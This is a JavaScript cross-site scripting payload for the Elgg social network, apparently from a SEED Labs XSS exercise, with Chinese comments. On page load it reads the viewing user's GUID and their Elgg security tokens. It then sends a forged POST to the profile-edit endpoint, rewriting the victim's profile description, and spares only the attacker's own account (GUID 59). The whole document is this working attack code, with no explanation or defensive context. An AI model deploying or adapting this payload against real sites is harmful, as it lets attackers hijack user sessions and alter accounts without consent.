<script type="text/javascript">
window.onload = function(){
    // 获取 user name, user guid, Time Stamp __elgg_ts, 和 Security Token __elgg_token
    var userName = elgg.session.user.name;
    var guid = "guid=" + elgg.session.user.guid;
    var ts = "__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "__elgg_token=" + elgg.security.token.__elgg_token;

    // 构造请求参数
    var description = "XSS Attack";  // 新描述内容

    // 构造POST内容
    var content = guid + "&" + ts + "&" + token + "&" + "description=" + encodeURIComponent(description);

    var samyGuid = "59";  // samyGuid
    var sendUrl = "http://www.seed-server.com/action/profile/edit";  // 需要发送请求的URL

    if (elgg.session.user.guid != samyGuid) {
        // 创建并发送AJAX请求，以修改个人资料
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendUrl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        
        // 发送POST请求，包含表单数据
        Ajax.send(content);
    }
}
</script>
